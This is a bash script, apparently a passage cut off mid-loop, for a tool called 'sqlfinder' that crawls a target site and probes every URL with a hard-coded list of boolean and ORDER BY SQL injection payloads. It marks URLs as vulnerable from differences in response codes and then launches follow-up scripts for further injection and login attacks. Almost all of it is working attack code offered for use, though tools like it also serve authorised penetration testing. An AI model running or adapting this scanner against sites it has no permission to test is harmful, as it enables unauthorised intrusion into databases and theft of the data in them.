#!/bin/bash
# sqlfinder v3.1
#Intensive scan enabled
#Added Count Check on pages
# ---------------- Colors ----------------
#-- Version Dev 1.1
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

WARNING="⚠️"
CHECK="✓"

#set -euo pipefail

# -------------- DEFAULTS
threads=20
file=""

vulnerable=false
verbose=false
header=""
intensive=false

SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
# ---------------- Help ----------------
show_help() {
  cat << 'EOF'

                                                          
 ▄▄▄▄▄▄▄       ▄▄    ▄▄▄▄▄▄▄              ▄▄             
█████▀▀▀       ██   ███▀▀▀▀▀ ▀▀           ██             
 ▀████▄  ▄████ ██   ███▄▄    ██  ████▄ ▄████ ▄█▀█▄ ████▄ 
   ▀████ ██ ██ ██   ███▀▀    ██  ██ ██ ██ ██ ██▄█▀ ██ ▀▀ 
███████▀ ▀████ ██   ███      ██▄ ██ ██ ▀████ ▀█▄▄▄ ██    
            ██ Crawling and Testing for SQL Injections---|=( 
            ▀▀                              
                                            by Cyber Samurai-- -|=
Usage:
  sqlfinder.sh <target> [options]
  sqlfinder.sh -f <file> [options]

Options:
  -f <file>          Load URLs from file instead of crawling
  -H <header>        Add custom HTTP header
  -t <threads>       Number of parallel requests (default: 1)
  -h, --help         Show this help message and exit
  -i                 Enable intense mode (time/error/union SQLi)

Examples:
  sqlfinder.sh https://example.com

  sqlfinder.sh -f urls.txt

  sqlfinder.sh https://example.com -t 50

  sqlfinder.sh https://example.com \
    -H "Authorization: Bearer eyJhbGciOi..."

  sqlfinder.sh -f api.txt -H "Cookie: session=abcd" -t 25

Description:
  sqlfinder crawls a target using katana (unless -f is used),
  filters URLs, and performs boolean-based SQL injection checks.

  By default, sqlfinder runs lightweight boolean checks.
  Use -i to enable aggressive SQL injection techniques.
  The Intense flag is still under development
EOF
}



# ---------------- Handle --help ----------------
for arg in "$@"; do
  if [[ "$arg" == "--help" ]]; then
    show_help
    exit 0
  fi
done

# ---------------- Positional target ----------------
target=""
if [[ "$1" != -* ]]; then
  target="$1"
  shift
fi

# ---------------- Parse flags ----------------
while getopts ":H:t:f:hiv" opt; do
  case "$opt" in
    H) header="$OPTARG" ;;
    t) threads="$OPTARG" ;;
    f) file="$OPTARG" ;;
    i) intensive=true ;;
    v) verbose=true ;;
    h)
      show_help
      exit 0
      ;;
    :)
      echo "Error: Option -$OPTARG requires an argument"
      exit 1
      ;;
    \?)
      echo "Invalid option: -$OPTARG"
      show_help
      exit 1
      ;;
  esac
done

#------------------DEBUG



#Validate input ----------------
if [[ -n "$file" ]] && [[ -n "$target" ]]; then
  echo "Error: Use either a target OR a file, not both"
  exit 1
fi

if [[ -z "$file" ]] && [[ -z "$target" ]]; then
  show_help
  exit 1
fi

if [[ -n "$file" ]] && [[ ! -f "$file" ]]; then
  echo "Error: File not found: $file"
  exit 1
fi



# ---------------- Curl body helper (for JavaScript check) ----------------
curl_body() {
  local CURL_ARGS=()
  
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  
  curl -s "${CURL_ARGS[@]}" "$1"
}

# Creates variation on the url from the collect_urls - Katana | uro output
add_number_variations() {
    local exceptions=("cart" "checkout" "logout" "login" "profile" "settings" "account")
    
    while IFS= read -r url; do
        [[ -z "$url" ]] && continue
        # Check if URL already ends with a number
        if [[ "$url" =~ /[0-9]+$ ]]; then
            echo "$url"
            continue
        fi
        # Check if URL ends with any exception word
        skip=false
        for exception in "${exceptions[@]}"; do
            if [[ "$url" =~ /${exception}$ ]]; then
                echo "$url"
                skip=true
                break
            fi
        done
        [[ "$skip" == true ]] && continue
        # If not, create variations with numbers 1-3
        echo "$url"
        for i in {1..3}; do
            echo "${url}/${i}"
        done
    done
}
# ---------------- Website Crawler and URL Filtering ----------------
collect_urls() {
  local target="$1"
  local KATANA_ARGS=()

  KATANA_ARGS=(-u "$target" -jsl -silent)
  [[ -n "$header" ]] && KATANA_ARGS+=(-H "$header")

  katana "${KATANA_ARGS[@]}" 2>/dev/null \
    | uro \
    | grep -Ev '\.(js|tsx|php|html|htm)(\?|$)' \
    | sed 's/=[^&[:space:]]*/=/'
}

# ---------------- Curl helper ----------------
curl_cmd() {
  local url="$1"
  local output
  local CURL_ARGS=()

  CURL_ARGS=(-s -o /dev/null -w "%{http_code}" --parallel --parallel-max "$threads")
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  CURL_ARGS+=("$url")

  output=$(curl "${CURL_ARGS[@]}")
  
  if [[ "$verbose" == true ]]; then
    echo "$url" 1>&2
  fi 
  echo "$output"  
}

# ---------------- Curl time helper ----------------
curl_time() {
  local CURL_ARGS=()
  
  CURL_ARGS=(-s -o /dev/null -w "%{time_total}")
  [[ -n "$header" ]] && CURL_ARGS+=(-H "$header")
  CURL_ARGS+=("$1")
  
  curl "${CURL_ARGS[@]}"
}

# ---------------- INITIALIZE ---------------
clear
if [[ "$verbose" == true ]]; then
  echo -e "Verbose output enabled"
fi

if [[ -n "$header" ]]; then
    echo -e "${GREEN}-----------------------------------Authenticated Scan-----------------------------------${NC}"
else
    echo -e "${YELLOW}------------------------------Non Authenticated Scan------------------------------${NC}"
fi

if [[ -n "$threads" ]]; then
    echo -e "Scanning using ${GREEN}$threads${NC} parallel jobs"
fi

if [[ "$intensive" == true ]]; then
banner=$(cat << 'EOF'
                          ░▀█▀░█▀█░▀█▀░█▀▀░█▀█░█▀▀░▀█▀░█░█░█▀▀
                          ░░█░░█░█░░█░░█▀▀░█░█░▀▀█░░█░░▀▄▀░█▀▀
                          ░▀▀▀░▀░▀░░▀░░▀▀▀░▀░▀░▀▀▀░▀▀▀░░▀░░▀▀▀
                                S C A N     E N A B L E D 
EOF
)
    echo -e "${YELLOW}$banner${NC}"
fi
echo -e "${GREEN}Initializing Scan on target:${NC} ${YELLOW}${target}${NC}"

# ---------------- URL source ----------------
if [[ -n "$file" ]]; then
  urls="$(cat "$file")"
else
  urls="$(collect_urls "$target" | add_number_variations)"
fi

# ---------------- Scan loop ----------------
# Add this array for false positive response patterns
declare -a falsePositiveResponse=(
    "You need to enable JavaScript to run this app"
    "Please enable JavaScript"
    "JavaScript is required"
    "enable javascript"
    "requires JavaScript"
    "This application requires JavaScript"
    "JavaScript must be enabled"
    "Please turn on JavaScript"
)



while IFS= read -r url; do
  [[ -z "$url" ]] && continue
  vulnerable=false

  # ---- Stage 0: False positive response check (FIRST check before anything else)
  body_response=$(curl_body "$url")
  skip_url=false
  
  for pattern in "${falsePositiveResponse[@]}"; do
    if echo "$body_response" | grep -qi "$pattern"; then
      echo -e "${YELLOW}[-] Skipping (false positive): $url${NC}"
      echo -e "${BLUE}  Reason: Contains pattern: \"$pattern\"${NC}"
      skip_url=true
      break
    fi
  done
  
  if [[ "$skip_url" == true ]]; then
    continue
  fi

  # ---- Stage 1: base check (skip dead only)
  base_code=$(curl_cmd "$url")
  [[ "$base_code" == "000" ]] && continue

  # ---- Stage 2: boolean injection (multiple payloads)
vulnerable=false

# Test a single payload for boolean injection
test_payload() {
  local url="$1"
  local payload="$2"
  local description="$3"
  
  response_code=$(curl_cmd "${url}/${payload}")
  
  # Check if response is 200 (true) or not 200 (false)
  if [[ "$response_code" == "200" ]]; then
    if [[ "$verbose" == true ]]; then
      echo -e "${BLUE}[*] Payload '$payload' returned TRUE (200)${NC}" 1>&2
    fi
    echo "true"
  else
    if [[ "$verbose" == true ]]; then
      echo -e "${BLUE}[*] Payload '$payload' returned FALSE ($response_code)${NC}" 1>&2
    fi
    echo "false"
  fi
}

# Array of payloads to test
declare -a payloads=(
  # Standard boolean injections
  "1%20AND%201=1--%20-"
  "1%20AND%202=1--%20-"
  "1%20OR%201=1--%20-"
  "1%20OR%201=2--%20-"
  
  # Quoted boolean injections
  "'1%20AND%201=1--%20-"
  "'1%20AND%202=1--%20-"
  "'1%20OR%201=1--%20-"
  "'1%20OR%201=2--%20-"
  
  # Double quoted boolean injections
  "\"%20AND%201=1--%20-"
  "\"%20AND%202=1--%20-"
  "\"%20OR%201=1--%20-"
  "\"%20OR%201=2--%20-"
  
  # Parentheses variations
  "(1)%20AND%201=1--%20-"
  "(1)%20AND%202=1--%20-"
  "1)%20AND%201=1--%20-"
  "1)%20AND%202=1--%20-"
  
  # ORDER BY injections
  "%20order%20by%201--%20-"
  "%20order%20by%2010--%20-"
  "'%20order%20by%201--%20-"
  "'%20order%20by%2010--%20-"
  "\"%20order%20by%201--%20-"
  "\"%20order%20by%2010--%20-"
  
  # Different comment styles
  "1%20AND%201=1%23"
  "1%20AND%202=1%23"
  "1%20AND%201=1/*comment*/--"
  "1%20AND%202=1/*comment*/--"
)

# Store results for comparison
declare -A payload_results
declare -a true_payloads=()
declare -a false_payloads=()

# Test all payloads
if [[ "$verbose" == true ]]; then
  echo -e "${BLUE}[*] Testing boolean injection payloads...${NC}" 1>&2
fi

for payload in "${payloads[@]}"; do
  result=$(test_payload "$url" "$payload" "Boolean test")
  payload_results["$payload"]="$result"
  
  if [[ "$result" == "true" ]]; then
    true_payloads+=("$payload")
  else
    false_payloads+=("$payload")
  fi
done

# Check if we have both true and false responses
if [[ ${#true_payloads[@]} -gt 0 ]] && [[ ${#false_payloads[@]} -gt 0 ]]; then
  echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
  echo -e "Reason: ${BLUE}Boolean injection detected - different responses for different payloads${NC}"
  echo -e "${BLUE}  True responses (200):${NC}"
  for p in "${true_payloads[@]:0:3}"; do  # Show first 3 true payloads
    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
  done
  echo -e "${BLUE}  False responses (not 200):${NC}"
  for p in "${false_payloads[@]:0:3}"; do  # Show first 3 false payloads
    echo -e "    ${YELLOW}${url}/${p//%20/ }${NC}"
  done
  
  vulnerable=true
  
  # Run additional tests
  if [[ -n "$header" ]]; then
    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
  else
    "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
  fi
  
  "$SCRIPT_DIR/sqlogin.sh" "$url" || true
fi

# Additional check: ORDER BY incremental testing
if [[ "$vulnerable" == false ]] && [[ "$intensive" == true ]]; then
  if [[ "$verbose" == true ]]; then
    echo -e "${BLUE}[*] Testing ORDER BY column count...${NC}" 1>&2
  fi
  
  # Test ORDER BY with increasing column numbers
  for i in {1..20}; do
    order_payload="%20order%20by%20${i}--%20-"
    response_code=$(curl_cmd "${url}/${order_payload}")
    
    if [[ "$response_code" != "200" ]] && [[ "$response_code" != "000" ]]; then
      echo -e "${WARNING}${RED} VULNERABLE${NC} $url"
      echo -e "Payload: ${YELLOW}${url}/ order by ${i}-- -${NC}"
      echo -e "Reason: ${BLUE}ORDER BY error at column $i (response: $response_code)${NC}"
      vulnerable=true
      
      # Run additional tests
      if [[ -n "$header" ]]; then
        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" -H "$header" || true
      else
        "$SCRIPT_DIR/sqlDiffFinder.sh" -u "$url" || true
      fi
      
      "$SCRIPT_DIR/sqlogin.sh" "$url" || true
      break
    fi
  done